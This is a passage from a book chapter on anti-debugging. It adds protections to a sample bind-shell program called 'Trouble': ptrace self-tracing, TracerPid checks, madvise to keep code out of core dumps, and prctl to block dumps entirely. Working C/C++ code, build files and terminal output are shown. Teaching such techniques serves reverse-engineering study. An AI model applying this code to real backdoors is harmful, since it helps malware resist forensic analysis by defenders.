= wait(&status);**\n**if (status >> 16 == PTRACE_EVENT_FORK)**\n{\n\n// follow the fork\n**long newpid = 0;**\nptrace(PTRACE_GETEVENTMSG, pid, NULL, &newpid);\nptrace(PTRACE_ATTACH, newpid, NULL, NULL);\nptrace(PTRACE_CONT, newpid, NULL, NULL);\n}\nptrace(PTRACE_CONT, pid, NULL, NULL);\n}\n}\n\n##### The code above will fork() a child process that becomes the tracer of the parent Trouble process via PTRACE_ATTACH. It will also automatically begin tracing any forks that Trouble creates due to the PTRACE_SETOPTIONS call. This largely addresses the issues that we had with the PTRACEME method because we now know the tracing program: Trouble! This also mostly addresses the issues we had with SIGTRAP. No one can simply attach to the main Trouble process since it is being traced by a child.\n\n However, this approach does have issues:\n\n 1. Anyone can attach to the child process tracing Trouble. 2. If the forked tracer gets killed then the main process doesn’t know. 3. Use of PTRACE_ATTACH requires escalated privileges.\n\n An example of the second point looks like this:\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 214\n\n Killing the child process in order to generate a core\n\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n6352 pts/21 Ss 0:00 bash\n6956 pts/21 R+ 0:00 **\\_ ps fa**\n6230 pts/9 Ss 0:00 bash\n6942 pts/9 S 0:00 **\\_ sudo su**\n6943 pts/9 S 0:00 **\\_ su**\n6944 pts/9 S 0:00 **\\_ bash**\n6954 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\n6955 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\nalbino-lobster@ubuntu:~$ sudo gcore 6954\nCould not attach to process. If your uid matches the uid of the target\nprocess, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try\nagain as the root user. For more details, see /etc/sysctl.d/10-ptrace.conf\nwarning: process 6954 is already traced by process 6955\nptrace: Operation not permitted.\nYou can't do that without a process to debug.\nThe program is not being run.\ngcore: failed to create core.6954\nalbino-lobster@ubuntu:~$ sudo kill -9 6955\nalbino-lobster@ubuntu:~$ sudo gcore 6954\n0x0000000000401328 in __syscall ()\nSaved corefile core.6954\nalbino-lobster@ubuntu:~$\n\n##### As you can see, before process 6955 gets killed gcore can’t create a core file for 6955. However, after sudo kill -9 6955 is executed, gcore is able to produce a core file.\n\n However, you can easily fix this problem by using the ptrace option PTRACE_O_- EXITKILL. This will send SIGKILL signals to all tracees if the tracer is killed. You can update the code to look like this:\n\nptrace(PTRACE_SETOPTIONS, getppid(), NULL, PTRACE_O_TRACEFORK | PTRACE_O_EXITKILL);\n\n##### Now if an attacker tries to kill the tracer then Trouble will simply disappear.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 215\n\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n6352 pts/21 Ss 0:00 bash\n7071 pts/21 R+ 0:00 **\\_ ps fa**\n6230 pts/9 Ss 0:00 bash\n7041 pts/9 S 0:00 **\\_ sudo su**\n7042 pts/9 S 0:00 **\\_ su**\n7043 pts/9 S 0:00 **\\_ bash**\n7068 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\n7069 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\nalbino-lobster@ubuntu:~$ sudo gcore 7068\nCould not attach to process. If your uid matches the uid of the target\nprocess, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try\nagain as the root user. For more details, see /etc/sysctl.d/10-ptrace.conf\nwarning: process 7068 is already traced by process 7069\nptrace: Operation not permitted.\nYou can't do that without a process to debug.\nThe program is not being run.\ngcore: failed to create core.7068\nalbino-lobster@ubuntu:~$ sudo kill 7069\nalbino-lobster@ubuntu:~$ sudo gcore 7068\nptrace: No such process.\nYou can't do that without a process to debug.\nThe program is not being run.\ngcore: failed to create core.7068\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n6352 pts/21 Ss 0:00 bash\n7086 pts/21 R+ 0:00 **\\_ ps fa**\n6230 pts/9 Ss 0:00 bash\n7041 pts/9 S 0:00 **\\_ sudo su**\n7042 pts/9 S 0:00 **\\_ su**\n7043 pts/9 S+ 0:00 **\\_ bash**\n\n### /proc/self/status\n\n##### In the previous section you learned a method for protecting Trouble from debuggers using a forked tracer. While the parent Trouble process is protected, the child tracer\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 216\n\n##### is still vulnerable to debuggers attaching to it. What can be done to help mitigate that? One way is that you can use the proc file system to see if a tracer is tracing our tracer. Here is an example from the command line.\n\n###### Understanding the the output of /proc/pid/status\n\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n6352 pts/21 Ss 0:00 bash\n7126 pts/21 R+ 0:00 **\\_ ps fa**\n6230 pts/9 Ss 0:00 bash\n7111 pts/9 S 0:00 **\\_ sudo su**\n7112 pts/9 S 0:00 **\\_ su**\n7113 pts/9 S 0:00 **\\_ bash**\n7123 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\n7124 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\nalbino-lobster@ubuntu:~$ cat /proc/7123/status | grep Pid:\nPid: 7123\nPPid: 7113\nTracerPid: 7124\n\n##### In the above output, I’ve pushed the status file for PID 7123 through grep. The output shows the current Pid (7123), the parent’s Pid (7113), and the tracer’s Pid (7124). We can update Trouble to also look up this information using /proc/self/status.\n\n###### Looking for the TracerPid in /proc/self/status\n\n/*\n\n - Checks the \"TracerPid\" entry in the /proc/self/status file. If the value\n\n - is not zero then a debugger has attached. If a debugger is attached then\n\n - signal to the parent pid and exit.\n*/\n**void check_proc_status()**\n{\n\n**FILE* proc_status = fopen(\"/proc/self/status\", \"r\");**\n**if (proc_status == NULL)**\n{\n\n**return;**\n}\n\n**char line[1024] = { };**\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 217\n\n**char *fgets(char *s, int size, FILE *stream);**\n**while (fgets(line, sizeof(line), proc_status) != NULL)**\n{\n\n**const char traceString[] = \"TracerPid:\";**\n**char* tracer = strstr(line, traceString);**\n**if (tracer != NULL)**\n{\n\n**int pid = atoi(tracer + sizeof(traceString) - 1);**\n**if (pid != 0)**\n{\nfclose(proc_status);\nkill(getppid(), SIGKILL);\nexit(EXIT_FAILURE);\n}\n}\n}\nfclose(proc_status);\n}\n\n/**\n\n - This implements a fairly simple bind shell. The server first requires a\n\n - password before allowing access to the shell. The password is currently\n\n - randomly generated each time 'cmake ..' is run. The server has no shutdown\n\n - mechanism so it will run until killed.\n*/\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n**int fork_pid = fork();**\n**if (fork_pid == 0)**\n{\n\n// trace the parent process\n**if (ptrace(PTRACE_ATTACH, getppid(), NULL, NULL) != 0)**\n{\nexit(EXIT_FAILURE);\n}\n\nptrace(PTRACE_SETOPTIONS, getppid(), NULL, PTRACE_O_TRACEFORK | PTRACE_O_EXIT\\\nKILL);\n\n// restart the parent so it can keep processing like normal\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 218\n\n**int status = 0;**\nwait(&status);\nptrace(PTRACE_CONT, getppid(), NULL, NULL);\n\n// handle any signals that may come in from tracees\n**while (true)**\n{\ncheck_proc_status(getpid());\n**int pid = waitpid(-1, &status, WNOHANG);**\n**if (pid == 0)**\n{\nsleep(1);\n**continue;**\n}\n\n**if (status >> 16 == PTRACE_EVENT_FORK)**\n{\n\n// follow the fork\n**long newpid = 0;**\nptrace(PTRACE_GETEVENTMSG, pid, NULL, &newpid);\nptrace(PTRACE_ATTACH, newpid, NULL, NULL);\nptrace(PTRACE_CONT, newpid, NULL, NULL);\n}\nptrace(PTRACE_CONT, pid, NULL, NULL);\n}\n}\n\n##### I’ve updated the tracer’s while(true) loop to use a non-blocking waitpid call so that it can check that “TracerPid:” line in /proc/self/status every second. While this won’t stop a debugger from attaching it will stop the debugger from being attached for a long time. For example:\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 219\n\n Detecting GDB via /proc/self/status\n\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n6352 pts/21 Ss 0:00 bash\n11050 pts/21 R+ 0:00 **\\_ ps fa**\n6230 pts/9 Ss 0:00 bash\n11032 pts/9 S+ 0:00 **\\_ sudo ./trouble/trouble**\n11033 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\n11034 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\nalbino-lobster@ubuntu:~$ sudo gdb -p 11034\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\".\nAttaching to process 11034\nReading symbols from /home/albino-lobster/antire_book/chap_6_debugger/dontpanic/build\\\n/trouble/trouble...(no debugging symbols found)...done.\n0x0000000000402264 in __syscall ()\n(gdb) c\nContinuing.\n\n[Inferior 1 (process 11034) exited with code 01]\n(gdb) quit\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n6352 pts/21 Ss 0:00 bash\n11062 pts/21 R+ 0:00 **\\_ ps fa**\n6230 pts/9 Ss+ 0:00 bash\nalbino-lobster@ubuntu:~$\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 220\n\n### madvise\n\n##### In the previous section, you introduced a new way to detect if a debugger is attached to Trouble’s tracing child. However, the method doesn’t protect against utilities that attach and detach without controlling executing like gcore.\n\n###### gcore still able to attach to Trouble’s tracing child\n\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n6369 pts/29 Ss+ 0:00 bash\n6352 pts/21 Ss 0:00 bash\n16614 pts/21 R+ 0:00 **\\_ ps fa**\n6230 pts/9 Ss 0:00 bash\n16611 pts/9 S+ 0:00 **\\_ sudo ./trouble/trouble**\n16612 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\n16613 pts/9 S+ 0:00 **\\_ ./trouble/trouble**\nalbino-lobster@ubuntu:~$ sudo gcore 16613\n0x0000000000402374 in __syscall ()\nSaved corefile core.16613\n\n##### As mentioned previously, a core file can be loaded into IDA and provides a view of Trouble that strips away many of the obfuscations techniques. However, there is a Linux function called madvise() that will allow us to exclude memory ranges from being included in a core file. From the man page:\n\n###### The madvise() system call is used to give advice or directions to the kernel about the address range beginning at address addr and with size length bytes. Initially, the system call sup‐ ported a set of “conventional” advice values, which are also available on several other implementations. (Note, though, that madvise() is not specified in POSIX.) Subsequently, a number of Linux-specific advice values have been added.\n\n##### One of the “Linux-specific advice values” is the MADV_DONTDUMP value. Again, from the madvise man page:\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 221\n\n MADV_DONTDUMP (since Linux 3.4) Exclude from a core dump those pages in the range specified by addr and length. This is useful in applica- tions that have large areas of memory that are known not to be useful in a core dump. The effect of MADV_DONTDUMP takes precedence over the bit mask that is set via the /proc/PID/coredump_filter file (see core(5)).\n\n##### Using madvise(), you can prevent gcore from dumping Trouble after the cryptor has been executed. The only real challenge is how to programmatically find the addresses to pass to madvise(). To do this I created another post-compilation tool. You can find this tool in the chapter 6 dontpanic directory under madvise. The project, as usual, contains two files.\n\n###### chap_6_debugger/dontpanic/madvise/CMakeLists.txt\n\nproject(madvise CXX)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_CXX_FLAGS \"-Wall -Wextra -g\")\n\nadd_executable(${PROJECT_NAME} src/madvise.cpp)\n\n###### chap_6_debugger/dontpanic/madvise/src/madvise.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <elf.h>\n\n/*\n\n - Parse the program headers and store the address/size of the first LOAD. Then walk\n\n - the section headers table looking for \".madvise_base_addr\" and \".madvise_size\"\n\n - where we'll store the address and size we pulled from the LOAD segment.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\return true if we found both .madvise sections\n*/\n**bool add_advise_info(std::string& p_data)**\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 222\n\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' || p_data[3] != 'F')**\n{\n\n**return false;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Shdr* sections = reinterpret_cast<Elf64_Shdr*>(&p_data[ehdr->e_shoff]);\nElf64_Half sections_count = ehdr->e_shnum;\n**if (sections_count == 0)**\n{\nstd::cerr << \"[-] No section table\" << std::endl;\n**return false;**\n}\n\nElf64_Shdr* strings_header = reinterpret_cast<Elf64_Shdr*>(\n\n&p_data[ehdr->e_shoff] + (ehdr->e_shentsize * ehdr->e_shstrndx));\n**const char* strings_table = &p_data[strings_header->sh_offset];**\n\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[ehdr->e_phoff]);\n**uint32_t base_address = phdr->p_vaddr;**\n**uint32_t size = phdr->p_filesz;**\n\n**int found = 0;**\nElf64_Shdr* current = sections;\n**for (int i = 0; i < sections_count; i++, current++)**\n{\nstd::string section_name(&strings_table[current->sh_name]);\n**if (section_name.find(\".madvise_base_addr\") == 0)**\n{\nmemcpy(&p_data[0] + current->sh_offset, &base_address,\n\n**sizeof(base_address));**\nfound++;\n}\n**else if (section_name.find(\".madvise_size\") == 0)**\n{\nmemcpy(&p_data[0] + current->sh_offset, &size, sizeof(size));\nfound++;\n}\n}\n\n**return (found == 2);**\n}\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 223\n\n**int main(int p_argc, char** p_argv)**\n{\n\n**if (p_argc != 2)**\n{\nstd::cerr << \"Usage: ./madvise <file path>\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to open the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)),\nstd::istreambuf_iterator<char>());\ninputFile.close();\n\n**if(!add_advise_info(input))**\n{\n\n**return EXIT_FAILURE;**\n}\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\nstd::cout << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), input.length());\noutputFile.close();\n\n**return EXIT_SUCCESS;**\n}\n\n##### This tool will look for two names in the section table: .madvise_base_addr and .madvise_size. The tool will copy the address and size found in the first program header into those section.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 224\n\n##### Next you need to update Trouble to use the madvise tool. The first step is to hook madvise into Trouble’s CMakeList.txt.\n\n###### chap_6_debugger/dontpanic/trouble/CMakeList.txt\n\nproject(trouble C)\ncmake_minimum_required(VERSION 3.0)\n\n# This will create a 32 byte \"password\" for the bind shell. This command\n# is only run when \"cmake\" is run, so if you want to generate a new password\n# then \"cmake ..; make\" should be run from the command line.\nexec_program(\"/bin/sh\"\n\n${CMAKE_CURRENT_SOURCE_DIR}\nARGS \"-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'\"\nOUTPUT_VARIABLE random_password )\n\n# Pass the random password into ${PROJECT_NAME} as a macro\nadd_definitions(-Dpassword=\"${random_password}\" -Dpassword_size=33)\n\nset(CMAKE_C_COMPILER musl-gcc)\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -static -std=gnu11 -Wno-int-to-pointer-cas\\\nt\")\nadd_executable(${PROJECT_NAME} src/trouble.c src/rc4.c)\n\nadd_custom_target(addLDS\n\nCOMMAND sed -i -e 's,-o,${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.lds -o,g' ./CM\\\nakeFiles/trouble.dir/link.txt)\n\nadd_dependencies(${PROJECT_NAME} addLDS)\n\n# After the build is successful, display the random password to the user\nadd_custom_command(TARGET ${PROJECT_NAME} POST_BUILD\n\nCOMMAND ${CMAKE_COMMAND} -E echo\n\"The bind shell password is:\" ${random_password})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../madvise/madvise ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../encryptFunctions/encryptFunctions ${CMAKE_CURRENT_BINARY_DIR}/${PROJEC\\\nT_NAME})\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 225\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../cryptor/cryptor ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})\n\n##### Also, the special sections need to be created in Trouble. As you’ve done in previous chapters, you can create special sections by using the section attribute.\n\n###### Adding the .madvise sections in Trouble\n\n**extern void* check_password_size;**\n**unsigned char check_password_key[128] __attribute((section(\".rc4_check_password\"))) =\\**\n{ 0 };\n\n**uint32_t madvise_base __attribute((section(\".madvise_base_addr\"))) = 0;**\n**uint32_t madvise_size __attribute((section(\".madvise_size\"))) = 0;**\n\n##### Finally, add the madvise() call to Trouble’s child tracer.\n\n###### Update the tracer’s code to call madvise()\n\nmadvise((void*)madvise_base, madvise_size, MADV_DONTDUMP);\n\n// handle any signals that may come in from tracees\n**while (true)**\n\n##### Now if you recompile Trouble you should see madvise as part of the build process.\n\n###### Trouble build output with madvise linked in\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ make\nScanning dependencies of target stripBinary\n\n[ 7%] Building CXX object stripBinary/CMakeFiles/stripBinary.dir/src/stripBinary.cpp\\\n.o\n\n[ 14%] Linking CXX executable stripBinary\n\n[ 14%] Built target stripBinary\nScanning dependencies of target fakeHeadersXBit\n\n[ 21%] Building CXX object fakeHeadersXBit/CMakeFiles/fakeHeadersXBit.dir/src/fakeHea\\\ndersXBit.cpp.o\n\n[ 28%] Linking CXX executable fakeHeadersXBit\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 226\n\n[ 28%] Built target fakeHeadersXBit\nScanning dependencies of target encryptFunctions\n\n[ 35%] Building CXX object encryptFunctions/CMakeFiles/encryptFunctions.dir/src/encry\\\nptFunctions.cpp.o\n\n[ 42%] Building CXX object encryptFunctions/CMakeFiles/encryptFunctions.dir/src/rc4.c\\\n.o\n\n[ 50%] Linking CXX executable encryptFunctions\n\n[ 50%] Built target encryptFunctions\nScanning dependencies of target madvise\n\n[ 57%] Building CXX object madvise/CMakeFiles/madvise.dir/src/madvise.cpp.o\n\n[ 64%] Linking CXX executable madvise\n\n[ 64%] Built target madvise\nScanning dependencies of target cryptor\n\n[ 71%] Building CXX object cryptor/CMakeFiles/cryptor.dir/src/cryptor.cpp.o\n\n[ 78%] Linking CXX executable cryptor\n\n[ 78%] Built target cryptor\nScanning dependencies of target addLDS\n\n[ 78%] Built target addLDS\nScanning dependencies of target trouble\n\n[ 85%] Building C object trouble/CMakeFiles/trouble.dir/src/trouble.c.o\n\n[ 92%] Building C object trouble/CMakeFiles/trouble.dir/src/rc4.c.o\n\n[100%] Linking C executable trouble\nThe bind shell password is: Jz117GoiWArnaXMEeCpnjJ2EbMKQ0gZD\n\n[+] Encrypted 0x3ef6\n\n[100%] Built target trouble\n\n##### Now if you create a core file using gcore the output looks the same.\n\n###### Core generation looks exactly the same\n\nalbino-lobster@ubuntu:~$ ps fa\nPID TTY STAT TIME COMMAND\n2399 pts/1 Ss 0:00 bash\n5713 pts/1 R+ 0:00 **\\_ ps fa**\n2135 pts/11 Ss 0:00 bash\n5710 pts/11 S+ 0:00 **\\_ sudo ./trouble/trouble**\n5711 pts/11 S+ 0:00 **\\_ ./trouble/trouble**\n5712 pts/11 S+ 0:00 **\\_ ./trouble/trouble**\nalbino-lobster@ubuntu:~$ sudo gcore 5712\n\n[sudo] password for albino-lobster:\n0x00000000004022a4 in __syscall ()\nSaved corefile core.5712\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 227\n\n##### However, if you look at the core’s program headers in readelf, you’ll notice that the 0x400000 range that Trouble executes out of is missing.\n\n###### madvise disappears the 0x400000 range\n\nalbino-lobster@ubuntu:~$ readelf -l ./core.5712\n\nElf file type is CORE (Core file)\nEntry point 0x0\nThere are 6 program headers, starting at offset 64\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nNOTE 0x0000000000000190 0x0000000000000000 0x0000000000000000\n0x00000000000009d0 0x0000000000000000 R 1\nLOAD 0x0000000000000b60 0x0000000000604000 0x0000000000000000\n0x0000000000002000 0x0000000000002000 RW 1\nLOAD 0x0000000000002b60 0x00000000007b0000 0x0000000000000000\n0x0000000000001000 0x0000000000001000 RW 1\nLOAD 0x0000000000003b60 0x00007ffef2576000 0x0000000000000000\n0x0000000000021000 0x0000000000021000 RW 1\nLOAD 0x0000000000024b60 0x00007ffef25cc000 0x0000000000000000\n0x0000000000002000 0x0000000000002000 R E 1\nLOAD 0x0000000000026b60 0xffffffffff600000 0x0000000000000000\n0x0000000000001000 0x0000000000001000 R E 1\n\nSection to Segment mapping:\nSegment Sections...\n\n00\n01 load\n02 load\n03 load\n04 load\n05 load\n\n##### Furthermore, if you drop the core into IDA, you’ll see that the 0x400000 range truly doesn’t exist in the core. This effectively hides all of Trouble’s code.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 228\n\n Top of the gcore generated core file in IDA\n\nload:0000000000604000 ; Input SHA256 : 9384EEBF41F681E6130F742FE80C068DDA7980A225549A\\\nE3D8F9D8515D7E3B88\nload:0000000000604000 ; Input MD5 : 8843AEE83C8AA457AD924AE1A12AB845\nload:0000000000604000 ; Input CRC32 : 3F22029C\nload:0000000000604000\nload:0000000000604000 ; File Name : C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vmware-Adm\\\ninistrator\\VMwareDnD\\6890e00b\\core.5712\nload:0000000000604000 ; Format : ELF64 for x86-64 (Core file)\nload:0000000000604000 ; Imagebase : 604000\nload:0000000000604000 ;\nload:0000000000604000\nload:0000000000604000 .686p\nload:0000000000604000 .mmx\nload:0000000000604000 .model flat\nload:0000000000604000 .intel_syntax noprefix\nload:0000000000604000\nload:0000000000604000 ; ====================================================\nload:0000000000604000\nload:0000000000604000 ; Segment type: Pure data\nload:0000000000604000 ; Segment permissions: Read/Write\nload:0000000000604000 load segment byte public 'DATA' use64\nload:0000000000604000 assume cs:load\nload:0000000000604000 ;org 604000h\nload:0000000000604000 db 6Bh ; k\nload:0000000000604001 db 31h ; 1\n\n### prctl\n\n##### In the previous section, you prevented the deobfuscated code from appearing in a core dump. However, maybe it would be better to not allow a core to be dumped at all? I’ve been using gcore to generate the core file so far. However, that isn’t necessary. A core can be generated simply by sending the correct signal a Trouble.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 229\n\n Generating a core using kill -11\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ls -l\ntotal 56\n-rw-rw-r-- 1 albino-lobster albino-lobster 13260 Dec 5 05:54 CMakeCache.txt\ndrwxrwxr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:30 CMakeFiles\n-rw-rw-r-- 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise\n-rw-rw-r-- 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:30 trouble\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo ./trouble/t\\\nrouble &\n\n[1] 7773\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ulimit -c unlimi\\\nted\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ps fa\nPID TTY STAT TIME COMMAND\n2135 pts/11 Ss 0:00 bash\n7773 pts/11 S 0:00 **\\_ sudo ./trouble/trouble**\n7774 pts/11 S 0:00 | **\\_ ./trouble/trouble**\n7775 pts/11 S 0:00 | **\\_ ./trouble/trouble**\n7776 pts/11 R+ 0:00 **\\_ ps fa**\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo kill -11 77\\\n75\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ls -l\ntotal 228\n-rw-rw-r-- 1 albino-lobster albino-lobster 13260 Dec 5 05:54 CMakeCache.txt\ndrwxrwxr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:30 CMakeFiles\n-rw-rw-r-- 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake\n-rw------- 1 root root 176128 Dec 5 17:32 core\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise\n-rw-rw-r-- 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:30 trouble\n\n[1]+ Killed sudo ./trouble/trouble\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo readelf -l \\\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 230\n\n./core\n\nElf file type is CORE (Core file)\nEntry point 0x0\nThere are 8 program headers, starting at offset 64\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nNOTE 0x0000000000000200 0x0000000000000000 0x0000000000000000\n0x0000000000000a38 0x0000000000000000 0\nLOAD 0x0000000000001000 0x0000000000400000 0x0000000000000000\n0x0000000000000000 0x0000000000005000 RWE 1000\nLOAD 0x0000000000001000 0x0000000000604000 0x0000000000000000\n0x0000000000002000 0x0000000000002000 RW 1000\nLOAD 0x0000000000003000 0x0000000002212000 0x0000000000000000\n0x0000000000001000 0x0000000000001000 RW 1000\nLOAD 0x0000000000004000 0x00007fff0efc8000 0x0000000000000000\n0x0000000000022000 0x0000000000022000 RW 1000\nLOAD 0x0000000000026000 0x00007fff0eff1000 0x0000000000000000\n0x0000000000002000 0x0000000000002000 R 1000\nLOAD 0x0000000000028000 0x00007fff0eff3000 0x0000000000000000\n0x0000000000002000 0x0000000000002000 R E 1000\nLOAD 0x000000000002a000 0xffffffffff600000 0x0000000000000000\n0x0000000000001000 0x0000000000001000 R E 1000\n\n##### Not only did this generate a core, but the 0x400000 range is clearly visible! We can’t allow this. Fortunately for us, Linux provides a function that you can use to prevent signals triggering core file generation. That function is prctl() used with the PR_- SET_DUMPABLE option. From the man page:\n\n#### PR_SET_DUMPABLE\n\n###### Set the state of the “dumpable” flag, which determines whether core dumps are produced for the calling process upon delivery of a signal whose default behavior is to produce a core dump.\n\n##### Use of prctl() is a simple one liner:\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 231\n\n Adding PR_SET_DUMPABLE to Trouble\n\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n**int fork_pid = fork();**\n**if (fork_pid == 0)**\n{\nprctl(PR_SET_DUMPABLE, 0);\n\n// trace the parent process\n**int parent = getppid();**\n\n##### Now if the reverse engineer tries to generate a core than nothing will happen.\n\n###### Core generation no longer works\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ls -l\ntotal 56\n-rw-rw-r-- 1 albino-lobster albino-lobster 13260 Dec 5 05:54 CMakeCache.txt\ndrwxrwxr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:51 CMakeFiles\n-rw-rw-r-- 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise\n-rw-rw-r-- 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:51 trouble\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo ./trouble/t\\\nrouble &\n\n[1] 8077\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ps fa\nPID TTY STAT TIME COMMAND\n2135 pts/11 Ss 0:00 bash\n8077 